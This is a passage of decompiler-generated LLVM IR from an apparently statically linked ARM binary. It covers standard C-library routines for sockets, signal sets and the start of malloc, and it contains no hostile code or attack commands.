  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_13be8, label %dec_label_pc_13c00, label %entry.dec_label_pc_13c08_crit_edge

entry.dec_label_pc_13c08_crit_edge:               ; preds = %entry
  br label %dec_label_pc_13c08

dec_label_pc_13c00:                               ; preds = %entry
  store i32 %v3_13bd8, i32* @r4, align 4
  store i32 %v9_13bd8, i32* @r6, align 4
  store i32 %v12_13bd8, i32* @r7, align 4
  store i32 %v15_13bd8, i32* @r8, align 4
  %v0_13c04 = call i32 @__sys_send()
  br label %dec_label_pc_13c08

dec_label_pc_13c08:                               ; preds = %entry.dec_label_pc_13c08_crit_edge, %dec_label_pc_13c00
  %v0_13c08 = call i32 @__libc_enable_asynccancel()
  %v0_13c0c = load i32, i32* @r6, align 4
  store i32 %v0_13c0c, i32* @r1, align 4
  store i32 %v0_13c08, i32* @r5, align 4
  %v0_13c18 = load i32, i32* @r8, align 4
  store i32 %v0_13c18, i32* @r3, align 4
  %v0_13c1c = load i32, i32* @r4, align 4
  store i32 %v0_13c1c, i32* @r0, align 4
  %v0_13c20 = call i32 @__sys_send()
  store i32 %v0_13c20, i32* @r4, align 4
  %v0_13c28 = load i32, i32* @r5, align 4
  %v1_13c2c = call i32 @__libc_disable_asynccancel(i32 %v0_13c28)
  %v0_13c30 = load i32, i32* @r4, align 4
  %v2_13c34 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13c34, i32* @r4, align 4
  store i32 %v6_13bd8, i32* @r5, align 4
  store i32 %v9_13bd8, i32* @r6, align 4
  store i32 %v12_13bd8, i32* @r7, align 4
  store i32 %v15_13bd8, i32* @r8, align 4
  store i32 %v18_13bd8, i32* @lr, align 4
  ret i32 %v0_13c30

; uselistorder directives
  uselistorder label %dec_label_pc_13c08, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13c44 = load i32, i32* @r4, align 4
  store i32 %v3_13c44, i32* %stack_var_-16, align 4
  %v0_13c58 = load i32, i32* @r0, align 4
  store i32 %v0_13c58, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13c58, -4095
  br i1 %tmp, label %dec_label_pc_13c80, label %dec_label_pc_13c68

dec_label_pc_13c68:                               ; preds = %entry
  %v0_13c6c = call i32 @__aeabi_read_tp()
  %v3_13c70 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13c70 = sext i16 %v3_13c70 to i32
  %v0_13c74 = load i32, i32* %r2.global-to-local, align 4
  %v1_13c74 = sub i32 0, %v0_13c74
  store i32 %v1_13c74, i32* %r2.global-to-local, align 4
  %v3_13c78 = add i32 %v4_13c70, %v0_13c6c
  %v4_13c78 = inttoptr i32 %v3_13c78 to i32*
  store i32 %v1_13c74, i32* %v4_13c78, align 4
  %v2_13c80.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_13c80

dec_label_pc_13c80:                               ; preds = %entry, %dec_label_pc_13c68
  %v1_13c84 = phi i32 [ %v0_13c58, %entry ], [ -1, %dec_label_pc_13c68 ]
  %v2_13c80 = phi i32 [ %v3_13c44, %entry ], [ %v2_13c80.pre, %dec_label_pc_13c68 ]
  store i32 %v2_13c80, i32* @r4, align 4
  ret i32 %v1_13c84

; uselistorder directives
  uselistorder i32 %v0_13c58, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13c80, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13c88:
  %v0_13c88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c88, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13c88
  %v2_13c8c = load i32, i32* @r4, align 4
  %v5_13c8c = mul i32 %v2_13c8c, 65536
  %v6_13c8c = and i32 %v5_13c8c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13c88, %bb
  %v7_13c8c = phi i32 [ %arg1, %dec_label_pc_13c88 ], [ %v6_13c8c, %bb ]
  ret i32 %v7_13c8c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13c90 = load i32, i32* @r4, align 4
  store i32 %v3_13c90, i32* %stack_var_-32, align 4
  %v6_13c90 = load i32, i32* @r5, align 4
  %v9_13c90 = load i32, i32* @r6, align 4
  %v12_13c90 = load i32, i32* @r7, align 4
  %v15_13c90 = load i32, i32* @r8, align 4
  %v18_13c90 = load i32, i32* @sb, align 4
  %v21_13c90 = load i32, i32* @sl, align 4
  %v24_13c90 = load i32, i32* @lr, align 4
  %v4_13ca0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 13000) to i32*), align 4
  %v2_13ca8 = icmp eq i32 %v4_13ca0, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_13ca8, label %dec_label_pc_13cc8, label %dec_label_pc_13cd4

dec_label_pc_13cc8:                               ; preds = %entry
  store i32 %v3_13c90, i32* @r4, align 4
  store i32 %v12_13c90, i32* @r7, align 4
  store i32 %v15_13c90, i32* @r8, align 4
  store i32 %v18_13c90, i32* %sb.global-to-local, align 4
  %v0_13cd0 = call i32 @__sys_sendto()
  br label %dec_label_pc_13cd4

dec_label_pc_13cd4:                               ; preds = %entry, %dec_label_pc_13cc8
  %v0_13cd4 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_13cd4, i32* @r5, align 4
  %v0_13ce8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13ce8, i32* @r0, align 4
  %v0_13cf0 = call i32 @__sys_sendto()
  store i32 %v0_13cf0, i32* @r4, align 4
  %v0_13cf8 = load i32, i32* @r5, align 4
  %v1_13cfc = call i32 @__libc_disable_asynccancel(i32 %v0_13cf8)
  %v0_13d00 = load i32, i32* @r4, align 4
  %v2_13d08 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_13d08, i32* @r4, align 4
  store i32 %v6_13c90, i32* @r5, align 4
  store i32 %v9_13c90, i32* @r6, align 4
  store i32 %v12_13c90, i32* @r7, align 4
  store i32 %v15_13c90, i32* @r8, align 4
  store i32 %v18_13c90, i32* @sb, align 4
  store i32 %v21_13c90, i32* @sl, align 4
  store i32 %v24_13c90, i32* @lr, align 4
  ret i32 %v0_13d00

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13cd4, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13d18 = load i32, i32* @r4, align 4
  store i32 %v3_13d18, i32* %stack_var_-12, align 4
  %v0_13d28 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13d28, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13d28, -4095
  br i1 %tmp, label %dec_label_pc_13d50, label %dec_label_pc_13d38

dec_label_pc_13d38:                               ; preds = %entry
  %v0_13d3c = call i32 @__aeabi_read_tp()
  %v3_13d40 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13d40 = sext i16 %v3_13d40 to i32
  store i32 %v4_13d40, i32* @r3, align 4
  %v0_13d44 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d44 = sub i32 0, %v0_13d44
  store i32 %v1_13d44, i32* %r2.global-to-local, align 4
  %v3_13d48 = add i32 %v4_13d40, %v0_13d3c
  %v4_13d48 = inttoptr i32 %v3_13d48 to i32*
  store i32 %v1_13d44, i32* %v4_13d48, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13d50.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13d50

dec_label_pc_13d50:                               ; preds = %entry, %dec_label_pc_13d38
  %v1_13d54 = phi i32 [ %v0_13d28, %entry ], [ -1, %dec_label_pc_13d38 ]
  %v2_13d50 = phi i32 [ %v3_13d18, %entry ], [ %v2_13d50.pre, %dec_label_pc_13d38 ]
  store i32 %v2_13d50, i32* @r4, align 4
  ret i32 %v1_13d54

; uselistorder directives
  uselistorder i32 %v0_13d28, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13d50, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13d58:
  %v0_13d58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13d58, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13d58
  %v2_13d5c = load i32, i32* @r4, align 4
  %v3_13d5c = load i32, i32* @r7, align 4
  %v8_13d5c = lshr i32 %v2_13d5c, %v3_13d5c
  %v9_13d5c = and i32 %v8_13d5c, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13d58, %bb
  %v10_13d5c = phi i32 [ %arg1, %dec_label_pc_13d58 ], [ %v9_13d5c, %bb ]
  ret i32 %v10_13d5c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13d60 = load i32, i32* @r7, align 4
  store i32 %v3_13d60, i32* %stack_var_-8, align 4
  %v0_13d6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13d6c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13d6c, -4095
  br i1 %tmp, label %dec_label_pc_13d94, label %dec_label_pc_13d7c

dec_label_pc_13d7c:                               ; preds = %entry
  %v0_13d80 = call i32 @__aeabi_read_tp()
  %v3_13d84 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13d84 = sext i16 %v3_13d84 to i32
  store i32 %v4_13d84, i32* @r3, align 4
  %v0_13d88 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d88 = sub i32 0, %v0_13d88
  store i32 %v1_13d88, i32* %r2.global-to-local, align 4
  %v3_13d8c = add i32 %v4_13d84, %v0_13d80
  %v4_13d8c = inttoptr i32 %v3_13d8c to i32*
  store i32 %v1_13d88, i32* %v4_13d8c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13d94.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13d94

dec_label_pc_13d94:                               ; preds = %entry, %dec_label_pc_13d7c
  %v1_13d98 = phi i32 [ %v0_13d6c, %entry ], [ -1, %dec_label_pc_13d7c ]
  %v2_13d94 = phi i32 [ %v3_13d60, %entry ], [ %v2_13d94.pre, %dec_label_pc_13d7c ]
  store i32 %v2_13d94, i32* @r7, align 4
  ret i32 %v1_13d98

; uselistorder directives
  uselistorder i32 %v0_13d6c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13d94, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_13d9c:
  %v0_13d9c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13d9c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13d9c
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_13d9c = load i32, i32* @sb, align 4
  %v8_13d9c = shl i32 %v2_13d9c, %tmp
  %v9_13d9c = and i32 %v8_13d9c, %arg1
  store i32 %v9_13d9c, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13d9c, %bb
  %v8_13da0 = phi i32 [ %arg1, %dec_label_pc_13d9c ], [ %v9_13d9c, %bb ]
  ret i32 %v8_13da0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_13dbc, label %dec_label_pc_13db4

dec_label_pc_13db4:                               ; preds = %entry
  %v7_13db8 = icmp slt i32 %arg2, 65
  br i1 %v7_13db8, label %dec_label_pc_13dd8, label %dec_label_pc_13dbc

dec_label_pc_13dbc:                               ; preds = %dec_label_pc_13db4, %entry
  %v0_13dc0 = call i32 @__aeabi_read_tp()
  %v3_13dc4 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13dc4 = sext i16 %v3_13dc4 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13dd0 = add i32 %v4_13dc4, %v0_13dc0
  %v4_13dd0 = inttoptr i32 %v3_13dd0 to i32*
  store i32 22, i32* %v4_13dd0, align 4
  %v0_13de0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13de0

dec_label_pc_13dd8:                               ; preds = %dec_label_pc_13db4
  %v0_13dd8 = call i32 @__sigaddset()
  store i32 %v0_13dd8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13de0

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13dbc, %dec_label_pc_13dd8
  %v0_13de0 = phi i32 [ %v0_13de0.pre, %dec_label_pc_13dbc ], [ %v0_13dd8, %dec_label_pc_13dd8 ]
  ret i32 %v0_13de0

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13de0, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_13dfc = add i32 %tmp, 4
  %v3_13dfc = inttoptr i32 %v2_13dfc to i32*
  store i32 0, i32* %v3_13dfc, align 4
  %v1_13e00 = load i32, i32* %r3.global-to-local, align 4
  %v2_13e00 = inttoptr i32 %v1_13e00 to i32*
  store i32 0, i32* %v2_13e00, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13e08 = load i32, i32* @r4, align 4
  store i32 %v3_13e08, i32* %stack_var_-16, align 4
  %v6_13e08 = load i32, i32* @r5, align 4
  %v9_13e08 = load i32, i32* @r6, align 4
  %v7_13e10 = icmp eq i32 %arg2, -1
  br i1 %v7_13e10, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_13e18 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_13e34

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_13e3c

dec_label_pc_13e34:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r6, align 4
  %v7_13e38 = icmp slt i32 %arg1, 65
  br i1 %v7_13e38, label %dec_label_pc_13e58, label %dec_label_pc_13e3c

dec_label_pc_13e3c:                               ; preds = %.thread16, %dec_label_pc_13e34
  %v0_13e40 = call i32 @__aeabi_read_tp()
  %v3_13e44 = load i16, i16* @global_var_2447c.761, align 2
  %v4_13e44 = sext i16 %v3_13e44 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_13e50 = add i32 %v4_13e44, %v0_13e40
  %v4_13e50 = inttoptr i32 %v3_13e50 to i32*
  store i32 22, i32* %v4_13e50, align 4
  %v0_13eb0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_13e58:                               ; preds = %dec_label_pc_13e34
  %v2_13e58 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13e58, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_13e60 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_13e60, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_13e70 = call i32 @__sigaddset()
  %v0_13e78 = load i32, i32* @r5, align 4
  store i32 %v0_13e78, i32* %r1.global-to-local, align 4
  %v0_13e7c = load i32, i32* @r6, align 4
  %v2_13e7c = add i32 %v0_13e7c, 12096
  %v2_13e80 = call i32 @__GI___sigismember(i32 %v2_13e7c, i32 %v0_13e78)
  store i32 %v2_13e58, i32* %r1.global-to-local, align 4
  %v0_13e94 = load i32, i32* @r5, align 4
  %v3_13ea0 = call i32 @__libc_sigaction(i32 %v0_13e94, i32 %v2_13e58, i32 %v2_13e18)
  %v1_13ea4 = icmp slt i32 %v3_13ea0, 0
  br i1 %v1_13ea4, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_13e58
  %v5_13ea8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_13ea8, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_13e58
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_13e3c, %bb32
  %v0_13eb0 = phi i32 [ %v5_13ea8, %bb31 ], [ %v0_13eb0.pre, %dec_label_pc_13e3c ], [ -1, %bb32 ]
  %v2_13eb8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13eb8, i32* @r4, align 4
  store i32 %v6_13e08, i32* @r5, align 4
  store i32 %v9_13e08, i32* @r6, align 4
  ret i32 %v0_13eb0

; uselistorder directives
  uselistorder i32 %v2_13e58, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e3c, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_13ecc = add i32 %arg2, -1
  %v3_13ed0 = udiv i32 %v1_13ecc, 32
  %v4_13ed4 = mul nuw nsw i32 %v3_13ed0, 4
  %v5_13ed4 = add i32 %v4_13ed4, %arg1
  %v6_13ed4 = inttoptr i32 %v5_13ed4 to i32*
  %v7_13ed4 = load i32, i32* %v6_13ed4, align 4
  %v1_13ed8 = urem i32 %v1_13ecc, 32
  %v7_13ee0 = shl i32 1, %v1_13ed8
  %v8_13ee0 = and i32 %v7_13ed4, %v7_13ee0
  %v10_13ee0 = icmp ne i32 %v8_13ee0, 0
  %. = zext i1 %v10_13ee0 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_13ecc, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_13ef0 = load i32, i32* @r1, align 4
  %v1_13ef0 = add i32 %v0_13ef0, -1
  %v3_13ef4 = udiv i32 %v1_13ef0, 32
  %v0_13ef8 = load i32, i32* @r0, align 4
  %v4_13ef8 = mul nuw nsw i32 %v3_13ef4, 4
  %v5_13ef8 = add i32 %v0_13ef8, %v4_13ef8
  %v6_13ef8 = inttoptr i32 %v5_13ef8 to i32*
  %v7_13ef8 = load i32, i32* %v6_13ef8, align 4
  %v1_13efc = urem i32 %v1_13ef0, 32
  %v7_13f04 = shl i32 1, %v1_13efc
  %v8_13f04 = or i32 %v7_13ef8, %v7_13f04
  store i32 %v8_13f04, i32* %v6_13ef8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13ef0, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_13f14 = add i32 %arg2, -1
  %v3_13f18 = udiv i32 %v1_13f14, 32
  %v4_13f1c = mul nuw nsw i32 %v3_13f18, 4
  %v5_13f1c = add i32 %v4_13f1c, %arg1
  %v6_13f1c = inttoptr i32 %v5_13f1c to i32*
  %v7_13f1c = load i32, i32* %v6_13f1c, align 4
  %v1_13f20 = urem i32 %v1_13f14, 32
  %tmp = shl i32 -1, %v1_13f20
  %v8_13f28 = add i32 %tmp, -1
  %v9_13f28 = and i32 %v7_13f1c, %v8_13f28
  store i32 %v9_13f28, i32* %v6_13f1c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13f14, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_13f38 = udiv i32 %arg1, 256
  store i32 %v3_13f38, i32* %r1.global-to-local, align 4
  %v2_13f3c = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_13f3c, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_13f48 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_13f3c, i32 %v0_13f48)
  %v0_13f4c = load i32, i32* %r1.global-to-local, align 4
  %v1_13f4c = add i32 %v0_13f4c, 1048320
  %v3_13f50 = udiv i32 %v1_13f4c, 65536
  %v1_13f54 = and i32 %v3_13f50, 8
  %v6_13f58 = shl i32 %v0_13f4c, %v1_13f54
  %v1_13f5c = add i32 %v6_13f58, 520192
  %v3_13f60 = udiv i32 %v1_13f5c, 65536
  %v1_13f64 = and i32 %v3_13f60, 4
  %v6_13f68 = shl i32 %v6_13f58, %v1_13f64
  %v1_13f6c = add i32 %v6_13f68, 245760
  %v3_13f70 = udiv i32 %v1_13f6c, 65536
  %v1_13f74 = and i32 %v3_13f70, 2
  %v6_13f78 = shl i32 %v6_13f68, %v1_13f74
  store i32 %v6_13f78, i32* %r1.global-to-local, align 4
  %v1_13f7c = sub nsw i32 13, %v1_13f54
  %v2_13f80 = sub nsw i32 %v1_13f7c, %v1_13f64
  %v3_13f84 = udiv i32 %v6_13f78, 32768
  %v4_13f84 = sub nuw nsw i32 -1, %v3_13f84
  %v4_13f88 = udiv i32 %v6_13f78, 16384
  %v5_13f88 = and i32 %v4_13f88, %v4_13f84
  %v2_13f8c = sub nsw i32 %v2_13f80, %v1_13f74
  %v2_13f90 = add nsw i32 %v2_13f8c, %v5_13f88
  %v1_13f94 = add nsw i32 %v2_13f90, 6
  %v0_13f98 = load i32, i32* %ip.global-to-local, align 4
  %v6_13f98 = lshr i32 %v0_13f98, %v1_13f94
  %v3_13f9c = mul nsw i32 %v2_13f90, 4
  %v1_13fa0 = add nsw i32 %v3_13f9c, 32
  %v1_13fa4 = urem i32 %v6_13f98, 4
  %v2_13fa8 = or i32 %v1_13fa4, %v1_13fa0
  ret i32 %v2_13fa8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_13fb0 = load i32, i32* @r4, align 4
  %v6_13fb0 = load i32, i32* @r5, align 4
  %v9_13fb0 = load i32, i32* @r6, align 4
  %v12_13fb0 = load i32, i32* @r7, align 4
  %v15_13fb0 = load i32, i32* @r8, align 4
  %v18_13fb0 = load i32, i32* @sb, align 4
  %v21_13fb0 = load i32, i32* @sl, align 4
  %v24_13fb0 = load i32, i32* @fp, align 4
  %v27_13fb0 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r1.global-to-local, align 4
  %v4_13fc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 108) to i32*), align 4
  store i32 %v4_13fc4, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_13fd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 68) to i32*), align 4
  store i32 %v4_13fd0, i32* %r1.global-to-local, align 4
  %v0_13fd4 = load i32, i32* @r0, align 4
  store i32 %v0_13fd4, i32* @r5, align 4
  store i32 %v4_13fc4, i32* %r2.global-to-local, align 4
  %v2_13fdc = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_13fdc, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %ip.global-to-local, align 4
  %v4_13fe8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 112) to i32*), align 4
  store i32 %v4_13fe8, i32* %ip.global-to-local, align 4
  store i32 81908, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13fe8)
  %v0_13ff4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13ff4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r1, align 4
  %v4_14000 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 16) to i32*), align 4
  store i32 %v4_14000, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_1400c.850 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14000)
  %v0_1400c = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1400c, -32
  br i1 %tmp, label %dec_label_pc_14030, label %dec_label_pc_14014

dec_label_pc_14014:                               ; preds = %entry
  store i32 66648, i32* %r2.global-to-local, align 4
  %v0_14018 = call i32 @__aeabi_read_tp()
  store i32 %v0_14018, i32* %r0.global-to-local, align 4
  %v3_1401c = load i16, i16* @global_var_2447c.761, align 2
  %v4_1401c = sext i16 %v3_1401c to i32
  store i32 %v4_1401c, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_14028 = add i32 %v4_1401c, %v0_14018
  %v4_14028 = inttoptr i32 %v3_14028 to i32*
  store i32 12, i32* %v4_14028, align 4
  br label %dec_label_pc_148b4

dec_label_pc_14030:                               ; preds = %entry
  %v1_14030 = add i32 %v0_1400c, 11
  store i32 %v1_14030, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r2.global-to-local, align 4
  %v2_1403c = icmp ugt i32 %v1_14030, 14
  %v7_1403c = icmp eq i32 %v1_14030, 15
  %v2_14040 = xor i1 %v7_1403c, true
  %v3_14040 = and i1 %v2_1403c, %v2_14040
  br i1 %v3_14040, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_14030
  %v5_14040 = and i32 %v1_14030, -8
  store i32 %v5_14040, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_14030, %bb
  %v4_14044 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 64) to i32*), align 4
  store i32 %v4_14044, i32* @r0, align 4
  %v1_14048 = inttoptr i32 %v4_14044 to i32*
  %v2_14048 = load i32, i32* %v1_14048, align 4
  store i32 %v2_14048, i32* @r4, align 4
  %v2_1404c = xor i1 %v2_1403c, true
  %v3_1404c = or i1 %v7_1403c, %v2_1404c
  br i1 %v3_1404c, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_14050 = urem i32 %v2_14048, 2
  %v2_14050 = icmp eq i32 %v1_14050, 0
  br i1 %v2_14050, label %dec_label_pc_14058, label %dec_label_pc_14068

dec_label_pc_14058:                               ; preds = %bb143
  %v2_14058 = icmp eq i32 %v2_14048, 0
  br i1 %v2_14058, label %dec_label_pc_14060, label %dec_label_pc_14444

dec_label_pc_14060:                               ; preds = %dec_label_pc_14058
  %v0_14060 = call i32 @__malloc_consolidate()
  store i32 %v0_14060, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14444

dec_label_pc_14068:                               ; preds = %bb143
  %v0_14068 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_14068, %v2_14048
  br i1 %tmp204, label %dec_label_pc_14090, label %dec_label_pc_14070

